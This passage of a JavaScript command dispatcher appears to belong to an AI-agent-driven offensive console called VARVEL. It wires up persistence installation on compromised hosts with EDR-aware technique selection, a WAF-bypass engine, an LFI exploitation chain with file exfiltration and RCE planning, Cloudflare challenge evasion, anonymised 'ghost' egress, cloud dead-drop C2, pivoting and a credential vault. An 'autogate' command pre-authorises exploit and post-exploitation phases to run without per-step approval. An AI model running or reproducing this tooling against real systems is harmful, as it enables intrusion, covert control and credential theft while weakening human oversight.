      //   audit <agentId> [api]                               -> task persist-audit (engagement sweep)
      //   select <agentId> [techniquesCsv] [api]              -> EDR-AWARE SELECTION:
      //     measure the target's posture (which logs answer, audit policy, SACL,
      //     Defender behavior/ASR) and rank classic+deep techniques by predicted
      //     install-time visibility — 'lower predicted visibility against the measured
      //     posture', NEVER 'undetectable' (tools/persist.mjs).
      //   cycle <agentId> <techniquesCsv> [name] [api]        -> THE SIGNATURE LOOP:
      //     install -> detoracle verdict on the install moment -> verified remove ->
      //     status (tools/persist.mjs). Cleanup-proof enforced: a removal that does not
      //     verify is reported as a loud loose end, never a quiet pass.
      // Gated exactly like exec-assembly: engagement persist.enabled (default OFF) AND
      // the agent's own persist flag — refusals surface loud, never as a measurement.
      const sub = args[0];
      if (!sub || !args[1]) throw new Error("persist needs <install|remove|status|audit|select|cycle> <agentId> [techniquesCsv|all|jsonSpec] [name] [api] — cleanup-proof governed persistence on a live channel agent");
      const { assessPersist, selectPersistTechniques } = await import('../tools/persist.mjs');
      // Full-body first (the persist evidence JSON never fits the 120-char ledger
      // preview): drain THIS task's result from /api/channel/results; fall back to the
      // ledger preview honestly when the body isn't there yet/anymore.
      const mkTasker = (api) => async (agentId, kind, data) => {
        const r = await (await fetch(api + '/api/channel/task', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ agentId, kind, data }) })).json();
        if (!r || !r.taskId) return 'TASKING REFUSED: ' + ((r && r.error) || 'no taskId (unknown/killed agent)');
        for (let i = 0; i < 60; i++) { // registry/task/COM writes + verification can outlast a shell — 2 min patience
          await new Promise((res) => setTimeout(res, 2000));
          const full = await (await fetch(api + '/api/channel/results?agent=' + agentId + '&taskId=' + r.taskId)).json().catch(() => null);
          if (full && Array.isArray(full.results) && full.results.length) return String(full.results[0].data ?? '');
          const { tasks } = await (await fetch(api + '/api/channel/tasks?agent=' + agentId)).json();
          const x = (tasks || []).find((y) => y.taskId === r.taskId);
          if (x && x.status === 'resulted') return x.resultPreview || '';
        }
        return null;
      };
      if (sub === 'cycle') {
        if (!args[2]) throw new Error("persist cycle needs <agentId> <techniquesCsv> [name] [api]");
        const api = args[4] || 'http://127.0.0.1:8971';
        return await assessPersist({ taskAgent: mkTasker(api), agentId: args[1], techniques: args[2].split(',').map((s) => s.trim()).filter(Boolean), name: args[3] || null });
      }
      if (sub === 'select') {
        // EDR-aware selection: measure the posture over the channel, rank the set.
        //   persist select <agentId> [techniquesCsv] [api]
        const techs = args[2] && !args[2].startsWith('http') ? args[2].split(',').map((s) => s.trim()).filter(Boolean) : null;
        const api = (techs ? args[3] : args[2]) || 'http://127.0.0.1:8971';
        return await selectPersistTechniques({ taskAgent: mkTasker(api), agentId: args[1], ...(techs && techs.length ? { techniques: techs } : {}) });
      }
      const kindMap = { install: 'persist-install', remove: 'persist-remove', status: 'persist-status', audit: 'persist-audit' };
      const kind = kindMap[sub];
      if (!kind) throw new Error("persist: unknown sub-op '" + sub + "' (want install|remove|status|audit|select|cycle)");
      let data = '{}';
      let api = args[2] || 'http://127.0.0.1:8971';
      if (sub === 'install') {
        if (!args[2]) throw new Error("persist install needs <agentId> <techniquesCsv|jsonSpec> [name] [api] e.g. runkey,schtask,startup or '{\"techniques\":[\"comhijack\"],\"deep\":{...}}'");
        data = args[2].startsWith('{') ? args[2] : JSON.stringify({ techniques: args[2].split(',').map((s) => s.trim()).filter(Boolean), name: args[3] || undefined });
        api = (args[2].startsWith('{') ? args[3] : args[4]) || api;
      } else if (sub === 'remove') {
        if (!args[2]) throw new Error("persist remove needs <agentId> <techniquesCsv|all> [api] — removal is never ambiguous");
        data = args[2] === 'all' ? JSON.stringify({ all: true }) : args[2].startsWith('{') ? args[2] : JSON.stringify({ techniques: args[2].split(',').map((s) => s.trim()).filter(Boolean) });
        api = args[3] || api;
      } else if (sub === 'status') {
        data = args[2] ? (args[2].startsWith('{') ? args[2] : JSON.stringify({ techniques: args[2].split(',').map((s) => s.trim()).filter(Boolean) })) : '{}';
        api = args[3] || api;
      }
      const preview = await mkTasker(api)(args[1], kind, data);
      return { kind, agentId: args[1], result: preview };
    }
    case 'cfcheck': {
      // Challenge taxonomy on ONE response (gap-CFa): what exactly is defending this URL —
      // managed-js / turnstile / captcha / block-1020 / rate-limit / labyrinth-suspect / none,
      // with evidence signals. Detection is classification, never a bypass claim.
      if (!args[0]) throw new Error('cfcheck needs <url> — classify the challenge posture of a single response');
      const { checkUrl } = await import('../tools/cfmap.mjs');
      return await checkUrl(args[0]);
    }
    case 'cfmap': {
      // Challenge-surface mapping (gap-CFb): paced per-path posture map. Unchallenged paths
      // are reportable findings; a labyrinth-suspect detection STOPS the map (honeypot guard).
      if (!args[0]) throw new Error("cfmap needs <baseUrl> [pathsCsv] — paced per-path challenge posture map, e.g. cfmap https://example.com '/,/api,/feed'");
      const { mapSurface, DEFAULT_PATHS } = await import('../tools/cfmap.mjs');
      const paths = args[1] ? args[1].split(',').map((s) => s.trim()).filter(Boolean) : DEFAULT_PATHS;
      return await mapSurface(args[0], { paths, paceMs: Number(args[2]) || undefined });
    }
    case 'originintel': {
      // Origin discovery v2 (gap-CFc follow-through): passive = crt.sh SANs + historical
      // DNS + SPF chains + favicon hash vs live-cached Cloudflare ranges (dated fallback).
      // 'originintel <domain> [verify --scope cidrCsv]' — verify probes candidates with
      // TLS SNI/Host pinned to the domain, but ONLY inside the signed scope: out-of-scope
      // candidates are REFUSED with the exact /32|/128 to ask signed in (refusal = data).
      if (!args[0]) throw new Error('originintel needs <domain> [verify --scope cidrCsv] — passive origin discovery; verify probes ONLY in-scope candidates');
      const { originDiscover, SCOPE_GATE } = await import('../tools/originintel.mjs');
      const si = args.indexOf('--scope');
      const r = await originDiscover(args[0], { mode: args.includes('verify') ? 'verify' : 'passive', scope: si !== -1 ? args[si + 1] : undefined });
      return { ...r, scopeGate: r.scopeGate || SCOPE_GATE };
    }
    case 'wafbypass': {
      // WAF-bypass mutation engine (the Wordfence-lock key for the Madara LFI): transform
      // matrix x marker-verified oracle; every PASS re-verified 3x and never claimed
      // without marker evidence. Signed-scope gate BEFORE any packet (refusal prints the
      // CIDRs); all egress rides the ghost chain, fail-closed.
      const { cli } = await import('../tools/wafbypass.mjs');
      return await cli(args);
    }
    case 'lfichain': {
      // LFI toolkit for the CVE-2025-4524 class: probe (capability matrix) -> read
      // (php://filter b64 exfil; contents land in the evidence dir ONLY, reports carry
      // sha256+size) -> rce-oracle (wrapwrap-style chain planner; --operator-confirm
      // gated, audited) / sesscheck (detection-only). Consumes wafbypass passing shapes.
      const { cli } = await import('../tools/lfichain.mjs');
      return await cli(args);
    }
    case 'egressbench': {
      // Egress measurement harness (gap-CFf): OBSERVED challenge rate per egress. A rate is
      // a measurement (zone, time), never a capability claim. 'egressbench <url> [samples] [direct|socks5://h:p,...]'
      if (!args[0]) throw new Error("egressbench needs <url> [samples] [egressCsv] — e.g. egressbench https://example.com 6 'direct,socks5://10.64.0.1:1080'");
      const { benchEgress } = await import('../tools/egressbench.mjs');
      const egresses = args[2]
        ? args[2].split(',').map((s) => s.trim()).filter(Boolean).map((e) => e === 'direct' ? { id: 'direct' } : { id: e, proxy: e })
        : [{ id: 'direct' }];
      return await benchEgress(args[0], { egresses, samples: Number(args[1]) || undefined });
    }
    case 'cfetch': {
      // Browser-fingerprint-parity fetch (gap-CFd): curl-impersonate subprocess. Honest label
      // locked: 'fingerprint parity at the transport layer — NOT a challenge bypass'. Reports
      // supported:false with the installer path when no binary exists (upstream ships no
      // Windows build; varvel/bin/ or CURL_IMPERSONATE supplies one).
      if (!args[0]) throw new Error('cfetch needs <url> [proxy] — fetch with browser TLS/H2 fingerprint parity (honest unsupported state when no curl-impersonate binary)');
      const { fetchImpersonated } = await import('../tools/impersonate.mjs');
      return await fetchImpersonated(args[0], { proxy: args[1] || undefined });
    }
    case 'clearance': {
      // cf_clearance broker (gap-CFe): a stealth browser mints the cookie, the vault rides
      // it (zone|egress|UA keyed, 45-min TTL). Two engines: nodriver (raw-CDP sidecar,
      // AGPL — subprocess only) or patchright + real Chrome; default auto picks nodriver
      // when its venv is healthy. Mint is PROVEN against the challenge engine — never
      // claimed without an observed challenge-free response.
      // 'clearance mint <url> [nodriver|patchright] [--headless] [--direct-egress] [--engagement <id>]' | 'clearance status [url] [--engagement <id>]'.
      // Headed = visible window by design.
      // ENGAGEMENT RESOLUTION (2026-08-12, the live operator-miss fix): --engagement wins
      // when present; absent, the bucket DEFAULTS to the currently-armed engagement
      // (armedEngagement: VARVEL_ENGAGEMENT, else the signed session's workspace); nothing
      // armed anywhere -> the legacy 'default' bucket, and the result NAMES the bucket.
      // GHOST-AWARE EGRESS (2026-08-10, live-proven): cf_clearance is IP-bound to the MINT
      // egress, so when ghost mode is armed the mint DEFAULTS to riding the ghost chain
      // (resolveMintEgress) and vaults under the chain's canonical egress id — the same
      // id the ride side (cfride/cfbrowser/status) looks up. Ghost required + no chain =
      // fail-closed refusal; --direct-egress mints direct WITH a loud warning.
      const sub = args[0];
      const broker = await import('../tools/clearance/broker.mjs');
      const engFlag = (() => { const i = args.indexOf('--engagement'); return i >= 0 && args[i + 1] ? args[i + 1] : undefined; })();
      const eng = engFlag || await armedEngagement(); // explicit flag > armed engagement > legacy 'default'
      const bucket = eng || 'default';
      if (sub === 'mint') {
        if (!args[1]) throw new Error("clearance mint needs <url> — stealth-browser mint of cf_clearance (opens a VISIBLE Chrome window; proven against the zone before vaulting)");
        // 'clearance mint <url> [nodriver|patchright|auto] [--headless] [--direct-egress]' — default auto:
        // nodriver (raw-CDP sidecar) when its venv is healthy, else patchright.
        const flags = args.slice(2);
        const engine = flags.find((f) => f === 'nodriver' || f === 'patchright' || f === 'auto') || 'auto';
        const plan = broker.resolveMintEgress({ ...ghostSettings(eng), directEgress: flags.includes('--direct-egress') });
        if (!plan.ok) return { minted: false, refused: true, engagement: bucket, reason: plan.reason };
        const r = await broker.mintClearance(args[1], {
          engine,
          headless: flags.includes('--headless'),
          timeoutMs: 180000, // 3min: interactive ticks need an operator window
          proxy: plan.proxy,
          proxyAuth: plan.proxyAuth,
          egressId: plan.egressId,
        });
        if (plan.warning) r.warning = plan.warning; // a direct mint under ghost stays LOUD in the result
        r.engagement = bucket; // the bucket this mint resolved into — printed, never a silent guess
        return r;
      }
      if (sub === 'status') {
        const egressId = broker.rideEgressId(ghostSettings(eng));
        const found = args[1] ? await broker.clearanceFor(args[1], { egressId }) : null;
        const vault = broker.readVault();
        const count = vault && vault.entries ? Object.keys(vault.entries).length : 0;
        return { entries: count, engagement: bucket, forUrl: args[1] || null, egressId, valid: found, note: found ? 'valid unexpired clearance on file' : 'no valid clearance — mint first (clearance mint <url>)' };
      }
      throw new Error("clearance needs a subcommand: 'mint <url>' or 'status [url]'");
    }
    case 'cfride': {
      // Ride vaulted clearance through the native tools (gap-CFe follow-through): the vault's
      // EXACT UA + cookie on every request, human-paced, proof-gated FIRST — a challenged
      // ride reports clearance-failure with evidence, never a fake assessment.
      // 'cfride <url> [crawl|apisurface|vulncheck] [maxPages]' | 'cfride <url> raw [jsonOpts {method,body,contentType}] [--full-body] [--engagement <id>]'
      // --full-body: raw returns the UNCAPPED body for evidence pulls (default stays 64KB-capped).
      // FLAG-SLOT FIX (2026-08-12, the live JSON.parse('--engagement') crash): flags are
      // separated from positionals FIRST (a value flag consumes its value), and the raw
      // jsonOpts positional is JSON.parsed ONLY when it actually looks like a JSON object
      // (leading '{') — anything else in that slot was a flag the parser above already
      // saw, never JSON. The '{}' positional form keeps working unchanged.
      // ENGAGEMENT RESOLUTION (the clearance-family order): explicit --engagement > the
      // armed engagement (armedEngagement) > the legacy 'default' bucket; the resolved
      // engagement drives BOTH the vault-lookup settings below and the ride's ghost
      // transport state (ride's engagement option), and is NAMED in the result.
      if (!args[0] || args[0] === '--full-body') throw new Error("cfride needs <url> [crawl|apisurface|vulncheck] [maxPages] or <url> raw [jsonOpts] [--full-body] [--engagement <id>] — ride vaulted clearance (proof-gated)");
      const { ride } = await import('../tools/cfride.mjs');
      const fullBody = args.includes('--full-body');
      const engFlag = (() => { const i = args.indexOf('--engagement'); return i >= 0 && args[i + 1] ? args[i + 1] : undefined; })();
      const engagement = engFlag || await armedEngagement(); // explicit flag > armed engagement > legacy 'default'
      const pos = [];
      for (let i = 0; i < args.length; i++) {
        if (args[i] === '--full-body') continue;         // boolean flag, captured above
        if (args[i] === '--engagement') { i++; continue; } // value flag, captured above
        if (args[i].startsWith('--')) continue;          // unknown flags are never positionals
        pos.push(args[i]);
      }
      const toolName = pos[1] || 'crawl';
      const opts = toolName === 'raw' && pos[2] && pos[2].startsWith('{') ? JSON.parse(pos[2]) : {};
      if (fullBody) opts.fullBody = true;
      // Vault-lookup parity with the mint side (2026-08-10): when ghost is armed the mint
      // vaults under the chain's canonical egress id — look up under the SAME id or the
      // vault silently misses. An explicit opts.egressId always wins. The SAME id also
      // drives the ride's TRANSPORT inside cfride (broker.resolveRideTransport, ghost
      // state from the same Settings): a chain-keyed entry exits through the ghost chain
      // — proof fetch AND sweep tools — never direct.
      if (!opts.egressId) {
        const broker = await import('../tools/clearance/broker.mjs');
        opts.egressId = broker.rideEgressId(ghostSettings(engagement));
      }
      const r = await ride(pos[0], { tool: toolName, maxPages: toolName === 'raw' ? undefined : (pos[2] ? Number(pos[2]) : undefined), engagement, ...opts });
      r.engagement = engagement || 'default'; // the bucket this ride resolved into — printed, never a silent guess
      r.egressId = opts.egressId;             // the vault-lookup id, named like the mint side names its own
      return r;
    }
    case 'sessride': {
      // The governed SESSION ride: vaulted cf_clearance + an authenticated cookie jar
      // (JSON [name,value] pairs) in ONE request path. Signed-scope gate BEFORE any
      // request (re-checked on every redirect hop; cross-host redirects are never
      // followed with the session), ghost egress parity with cfride via
      // broker.resolveRideTransport/rideEgressId, challenge-honest, and cookie VALUES
      // never appear in the report (names only).
      // 'sessride <url> --jar <file.json> --scope <cidrCsv> [--method POST] [--body <s>|--body-json <json>] [--content-type <ct>] [--headers <file.json>] [--cookie <header>] [--authcheck] [--no-save-jar] [--engagement <id>]'
      const { cli } = await import('../tools/sessride.mjs');
      return await cli(args);
    }
    case 'rendercheck': {
      // VISUAL confirmation of a target-side change (the cached-browser gap): renders
      // the page in a REAL headless browser (the nodriver raw-CDP sidecar's one-shot
      // --render mode) so the AI sees what a visitor's browser shows. Signed-scope
      // gate BEFORE anything; rides the vault clearance + ghost chain exactly like
      // cfride/sessride (resolveRideTransport; chain-keyed => Chrome --proxy-server at
      // launch; multi-hop and required+no-chain refuse fail-closed); --no-ride forces
      // a cookieless anonymous-visitor render. CACHE-AWARE: every request carries a
      // unique cache-buster and the verdict reads cf-cache-status -- origin-live vs
      // cached-copy, with the real-but-cloaked language when an expect is absent
      // behind a HIT. Challenge-honest (CHALLENGED with evidence, never a claim);
      // a missing --expect is a FAIL; screenshot PNG to --out (default
      // data/evidence/), path only, cookie values never reported.
      // 'rendercheck <url> --scope <cidrCsv> [--expect <text|re:...>] [--deny <text|re:...>] [--out <screenshot.png>] [--jar <file.json>] [--engagement <id>] [--egress-id <id>] [--no-ride]'
      const { cli } = await import('../tools/rendercheck.mjs');
      return await cli(args);
    }
    case 'cfbrowser': {
      // Browser-interaction tier as the vaulted identity (gap-CFf): open / forms /
      // fill-submit / probe-comment. VISIBLE window by design — interactive ticks are
      // operator-in-the-loop (the tool waits patiently). Challenge-gated on every
      // navigation; password-form submits require operatorApproved (privileged session
      // establishment is operator-gated). 'cfbrowser <action> <url> [jsonOpts]'
      if (!args[0] || !args[1]) throw new Error("cfbrowser needs <open|forms|fill-submit|probe-comment> <url> [jsonOpts] — browser interaction as the vaulted identity (visible window; challenge-gated)");
      const { cfbrowse } = await import('../tools/cfbrowser.mjs');
      const opts = args[2] ? JSON.parse(args[2]) : {};
      // Same vault-lookup parity as cfride: ghost armed => look up under the chain's
      // canonical egress id (what the mint side vaults under); explicit egressId wins.
      // The SAME id drives the launch transport inside cfbrowse (resolveRideTransport):
      // a chain-keyed entry launches the context THROUGH the chain's single-hop proxy.
      if (!opts.egressId) {
        const broker = await import('../tools/clearance/broker.mjs');
        opts.egressId = broker.rideEgressId(ghostSettings());
      }
      return await cfbrowse(args[0], args[1], opts);
    }
    case 'ghost': {
      // Ghost Mode self-check WITHOUT shell egress — the enclave correctly denies raw
      // curl to the proxy/IP-echo hosts (egress is research-allowlist-only), so the
      // identity check rides the VARVEL server, which performs the REAL proxied exit
      // measurement in-process. 'ghost [api]' → fresh verify + current posture.
      // 'ghost egress-check [api]' → the pre-flight: exit-IP stability (rotation kills
      // cf_clearance binding), org/ASN classification, and the optional expect-exit pin.
      if (args[0] === 'egress-check') {
        const eapi = args[1] || 'http://127.0.0.1:8971';
        let ec;
        try { ec = await (await fetch(eapi + '/api/ghost', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'exitCheck' }) })).json(); }
        catch (e) { return { error: 'VARVEL API unreachable at ' + eapi + ' — ' + (e && e.message || e) }; }
        return {
          exitCheck: ec,
          read: ec.verdict === 'rotating'
            ? 'exit ROTATING — pin ONE specific Mullvad server (not a city) before any clearance mint, or the cookie dies IP-bound'
            : ec.verdict === 'stable'
              ? (ec.pinMatch === false ? 'exit STABLE but ≠ the pinned expect-exit — check you are on the intended Mullvad server' : 'exit stable — clearance-class ops may proceed')
              : 'exit stability UNKNOWN — ' + (ec.reason || 'samples failed; see exitCheck'),
        };
      }
      const api = args[0] || 'http://127.0.0.1:8971';
      let st;
      try { st = await (await fetch(api + '/api/ghost', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'check' }) })).json(); }
      catch (e) { return { error: 'VARVEL API unreachable at ' + api + ' — ' + (e && e.message || e) }; }
      const v = st.verified || {};
      return {
        verify: v,
        mode: st.mode, chain: st.chain, dns: st.dns, privateDestinations: st.privateDestinations,
        read: v.ok === true
          ? 'identity chain VERIFIED — exit IP differs from baseline; public egress permitted'
          : (st.mode === 'off' ? 'ghost OFF — egress would expose the operator source' : 'NOT verified — do NOT touch public targets until verify reads ok:true'),
      };
    }
    case 'autogate': {
      // Operator pre-authorization for the sigil gates (engine/autogate.mjs — the
      // time-boxed, phase-allowlisted, count-capped, signed-scope-only delegation):
      //   autogate grant [--hours 12] [--max 8] [--phases exploit,postex] [--note "..."]
      //   autogate status | revoke | log [N]
      const { createGrant, saveGrant, loadGrant, revokeGrant, statusGrant, paths } = await import('../engine/autogate.mjs');
      const flag = (name) => { const i = args.indexOf('--' + name); return i >= 0 ? args[i + 1] : undefined; };
      const sub = args[0] || 'status';
      if (sub === 'grant') {
        const hours = Number(flag('hours') || 12);
        const max = Number(flag('max') || 8);
        const phases = String(flag('phases') || 'exploit,postex').split(',').map((s) => s.trim()).filter(Boolean);
        const note = String(flag('note') || '');
        const principal = process.env.USERNAME || process.env.USER || 'operator';
        try {
          const g = createGrant({ hours, max, phases, principal, note });
          saveGrant(g);
          return { ok: true, grant: g, read: `sigil gates pre-authorized until ${g.expiresAt} — phases ${g.phases.join('/')}, cap ${g.maxGrants}, signed scope only; every decision audited; 'autogate revoke' kills it instantly` };
        } catch (e) { return { ok: false, error: String((e && e.message) || e) }; }
      }
      if (sub === 'revoke') {
        const had = !!loadGrant();
        revokeGrant();
        return { ok: true, had, read: had ? 'grant revoked — sigil gates are human-only again' : 'no grant was on file' };
      }
      if (sub === 'log') {
        const n = Math.max(1, Number(args[1]) || 20);
        let lines = [];
        try { lines = readFileSync(paths().log, 'utf8').trim().split('\n').slice(-n); } catch {}
        return { log: paths().log, lines: lines.map((l) => { try { return JSON.parse(l); } catch { return l; } }) };
      }
      if (sub === 'status') return statusGrant();
      throw new Error('autogate needs grant [--hours N] [--max N] [--phases a,b] [--note t] | status | revoke | log [N]');
    }
    case 'floworacle': {
      // Flow-beacon self-test (gap#6): 'floworacle <agentId> [api]' scores the flow a live
      // agent produced (via GET /api/channel/flow); 'floworacle profile <name>' grades a
      // malleable cadence pre-deployment. Feature evidence, never a vendor verdict.
      const { fetchLive, preflight } = await import('../tools/floworacle.mjs');
      if (args[0] === 'profile') {
        if (!args[1]) throw new Error("floworacle profile needs <name> -- pre-deployment cadence grading of a malleable profile (web-browse|update-check|streaming|ops-tempo)");
        return preflight(args[1]);
      }
      if (!args[0]) throw new Error("floworacle needs <agentId> [api] -- score a live agent's flow beacon-likeness, or 'floworacle profile <name>' for pre-deployment grading");
      return await fetchLive(args[0], args[1] || 'http://127.0.0.1:8971');
    }
    case 'tradecraft': {
      // Agent-tradecraft oracle (gap#7): 'tradecraft <agentId> [api]' grades the shell
      // command stream a live agent was tasked with (GET /api/channel/tradecraft);
      // 'tradecraft check <jsonArray>' pre-flights a PLANNED command list locally.
      // Signatures + evidence only, never a vendor verdict, no evasion guidance.
      const { fetchLive, preflight } = await import('../tools/tradecraft.mjs');
      if (args[0] === 'check') {
        if (!args[1]) throw new Error('tradecraft check needs <jsonArray> -- pre-flight grade a planned command list, e.g. \'["whoami","ipconfig"]\'');
        return preflight(JSON.parse(args[1]));
      }
      if (!args[0]) throw new Error("tradecraft needs <agentId> [api] -- grade a live agent's command stream against the published AI-agent signatures, or 'tradecraft check <jsonArray>' for pre-flight");
      return await fetchLive(args[0], args[1] || 'http://127.0.0.1:8971');
    }
    case 'fporacle': {
      // The fingerprint self-awareness oracle: MEASURE the wire shape, never assert
      // undetectability. 'ja4s' actively probes a TLS server's hello; 'http' reads the
      // channel's passive JA4H/shape observation ring (GET /api/fp).
      const sub = args[0];
      if (sub === 'ja4s') {
        if (!args[1] || !args[2]) throw new Error('fporacle ja4s needs <host> <port> -- probe the server hello into a JA4S fingerprint');
        const { probeJa4s } = await import('../tools/fporacle.mjs');
        return await probeJa4s(args[1], Number(args[2]));
      }
      if (sub === 'http') {
        const api = args[1] || 'http://127.0.0.1:8971';
        const r = await (await fetch(api + '/api/fp')).json();
        if (!r.ok) return r;
        // Group the ring by distinct fingerprint: what a defender's JA4H database would
        // see us as, how often, and on which routes.
        const byJa4h = new Map();
        for (const o of r.observations || []) {
          const e = byJa4h.get(o.ja4h) || { ja4h: o.ja4h, seen: 0, routes: new Set(), shapeSummary: o.shapeSummary, lastAt: o.at };
          e.seen++; e.routes.add(o.route); e.shapeSummary = o.shapeSummary; e.lastAt = o.at;
          byJa4h.set(o.ja4h, e);
        }
        return {
          observations: (r.observations || []).length,
          distinctJa4h: r.distinctJa4h,
          fingerprints: [...byJa4h.values()].map((e) => ({ ...e, routes: [...e.routes] })),
        };
      }
      throw new Error("fporacle needs a subcommand: 'ja4s <host> <port>' or 'http [api]'");
    }
    case 'ghc2': {
      // Cloud/SaaS dead-drop C2 (engine/ghc2 + tools/ghc2): the arm/poll/detach path runs
      // INSIDE the live server (that's where the channel + ghost engine + settings live);
      // this command is the governed API client for it. The burner PAT is never an arg
      // here — it lives in the ghc2.token settings key (secret-class).
      const sub = args[0] || 'status';
      const api = (args[1] || 'http://127.0.0.1:8971').replace(/\/+$/, '');
      if (sub === 'status') {
        const st = await (await fetch(api + '/api/channel')).json();
        return { armed: !!st.armed, ghc: st.ghc || { configured: false } };
      }
      if (sub === 'arm' || sub === 'poll' || sub === 'detach') {
        const r = await fetch(api + '/api/channel/ghc', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: sub }) });
        return { httpStatus: r.status, ...(await r.json()) };
      }
      throw new Error("ghc2 needs a subcommand: 'arm', 'status', 'poll', or 'detach' [api] — cloud/SaaS dead-drop C2 (default-OFF; settings keys ghc2.enabled/ghc2.token/ghc2.repo/ghc2.intervalSec)");
    }
    case 'pivots': {
      // Pivot-mesh view (gap#4b): linked (SMB-pipe) agents grouped by parent+link, read
      // off the live channel's agent view (GET /api/channel — agents carry `via` when
      // linked). An empty list is the honest answer when no links are enrolled.
      const api = (args[0] || 'http://127.0.0.1:8971').replace(/\/+$/, '');
      const st = await (await fetch(api + '/api/channel')).json();
      if (!st.armed) return { armed: false, pivots: [] };
      const agents = st.agents || [];
      const byId = new Map(agents.map((a) => [a.agentId, a]));
      const links = new Map();
      for (const a of agents) {
        if (!a.via) continue;
        const key = a.via.parent + ':' + a.via.link;
        if (!links.has(key)) {
          const p = byId.get(a.via.parent);
          links.set(key, { parentId: a.via.parent, parentLabel: (p && p.label) || '', parentHealth: (p && p.health) || 'gone', linkId: a.via.link, pipe: a.via.pipe, children: [] });
        }
        links.get(key).children.push({ agentId: a.agentId, label: a.label, health: a.health, checkins: a.checkins, lastSeen: a.lastSeen });
      }
      return { armed: true, agents: agents.length, pivots: [...links.values()] };
    }
    case 'preflight': {
      // Defender-view infrastructure pre-flight (gap#8): scan our OWN listeners the way
      // internet-wide defenders (Censys/Shodan) see them -- cert identity, JA4S, JARM,
      // banners/body markers, egress class -- and report exposure honestly (findings +
      // honestGaps). 'preflight [host] [port,port,...]'; the default port set is the live
      // VARVEL one: the API (8971) plus whatever /api/channel reports armed.
      const { report } = await import('../tools/preflight.mjs');
      const host = args[0] || '127.0.0.1';
      let ports = args[1]
        ? args[1].split(',').map((s) => Number(s.trim())).filter((p) => Number.isInteger(p) && p > 0 && p <= 65535)
        : null;
      if (!ports || !ports.length) {
        ports = [8971];
        try {
          const st = await (await fetch('http://127.0.0.1:8971/api/channel')).json();
          if (st && st.armed) {
            if (Number.isInteger(st.port) && st.port > 0) ports.push(st.port);
            if (st.doh && st.doh.configured && st.doh.armed && Number.isInteger(st.doh.port) && st.doh.port > 0) ports.push(st.doh.port);
          }
        } catch { /* API unreachable: 8971 alone is still the honest default set */ }
      }
      return await report({ host, ports: [...new Set(ports)] });
    }
    case 'ldap': {
      if (!args[0]) throw new Error('ldap needs <host> [port] — anonymous rootDSE enumeration');
      return await ldapEnum(args[0], { port: Number(args[1]) || 389 });
    }
    case 'twinforge': {
      // record a defended in-scope target → synthesize a loopback twin → score fidelity.
      if (!args[0]) throw new Error('twinforge needs <baseUrl> [rateCap] — record + twin + fidelity in one governed pass');
      const profile = await recordDefense(args[0], { rateCap: Number(args[1]) || undefined });
      if (profile.refused) return profile;
      const twin = createTwin(profile);
      twin.on('clientError', (e, s) => { try { s.destroy(); } catch {} });
      await new Promise((r) => twin.listen(0, '127.0.0.1', r));
      try {
        const twinBase = `http://127.0.0.1:${twin.address().port}`;
        const fidelity = await fidelityCheck(profile, twinBase);
        return { profile, twin: { url: twinBase, note: 'twin was validated and closed — serve it long-running from the console' }, fidelity };
      } finally { twin.close(); }
    }
    case 'chainforge': {
      if (!args[0]) throw new Error("chainforge needs '<surfaceJson>' (endpoints/findings/material as JSON)");
      const input = JSON.parse(args[0]);
      return chainforge(input);
    }
    case 'posture': {
      const { detectStack } = await import('../engine/target-profile.mjs');
      const { comparePosture } = await import('../engine/posture.mjs');
      if (!args[0]) throw new Error('posture needs <baseUrl>');
      const fp = await detectStack(args[0], { timeout: 2500 });
      return comparePosture(fp, args[1] || null);
    }
    case 'state': {
      // External state store (gap: the agent forgets past ~5 steps) — counts, REDACTED
      // listings, the operator's ONE secret-reveal path, and operator notes. JSON out like
      // every house command ('--json' accepted for explicitness; the output already is).
      // 'state' | 'state <hosts|findings|creds|sessions> [--engagement <id>] [--json]' |
      // 'state cred <key> --reveal' | 'state note <text> [--engagement <id>]'
      const st = await import('../engine/statestore.mjs');
      const engFlag = (() => { const i = args.indexOf('--engagement'); return i >= 0 && args[i + 1] ? args[i + 1] : undefined; })();
      const eng = engFlag || process.env.VARVEL_ENGAGEMENT || 'default';
      const pos = [];
      for (let i = 0; i < args.length; i++) {
        if (args[i] === '--engagement') { i++; continue; }
        if (args[i].startsWith('--')) continue;
        pos.push(args[i]);
      }
      if (!pos.length) return { engagement: eng, counts: st.stateCounts(eng) };
      if (st.KINDS.includes(pos[0])) return { engagement: eng, kind: pos[0], items: st.query(eng, pos[0]).map(st.redact), redacted: true };
      if (pos[0] === 'cred') {
        if (!pos[1]) throw new Error("state cred needs <key> --reveal — key is '<kind>|<principal>' from 'state creds'");
        const c = st.get(eng, 'creds', pos[1]);
        if (!c) return { error: 'no cred with key ' + JSON.stringify(pos[1]) + ' in engagement ' + JSON.stringify(eng) };
        if (!args.includes('--reveal')) return { cred: st.redact(c), redacted: true, note: 'operator-side only: re-run with --reveal to print the secret once, to stdout' };
        return { engagement: eng, key: c.key, kind: c.kind, principal: c.principal, scope: c.scope || null, source: c.source || null, secret: c.secret, revealed: true };
      }
      if (pos[0] === 'note') {
        const text = pos.slice(1).join(' ').trim();
        if (!text) throw new Error('state note needs <text>');
        const n = st.addNote(eng, text, { actor: 'operator', sourceTool: 'cli' });
        return { noted: true, engagement: eng, at: n.ts };
      }
      throw new Error("state needs a subcommand: nothing (counts), 'hosts|findings|creds|sessions', 'cred <key> --reveal', or 'note <text>'");
    }
    case 'missions': {
      // Session resilience (gap #2): every Kimi-backed turn checkpoints at each tool-call
      // boundary. This lists the checkpointed missions + statuses; 'resume <id>' continues one.
      const { listMissions } = await import('../engine/missions.mjs');
      return { missions: listMissions() };
    }
    case 'resume': {
      // Reconstruct a checkpointed mission and CONTINUE it — the tool-call ledger makes the
      // resume idempotent (completed calls are replayed from the checkpoint, never re-fired).
      if (!args[0] || args[0].startsWith('--')) throw new Error('resume needs <missionId> [instruction] — see: missions');
      const { loadCheckpoint } = await import('../engine/missions.mjs');
      const cp = loadCheckpoint(args[0]);
      if (!cp) return { error: 'no checkpoint for mission ' + JSON.stringify(args[0]) + ' — run: missions' };
      if (cp.status === 'split') return { error: 'mission was split', successor: (cp.handoff && cp.handoff.newMission) || null, hint: 'resume the successor mission instead' };
      if (!cp.wsDir) return { error: 'checkpoint has no sealed workspace recorded — cannot resume safely', missionId: cp.missionId };
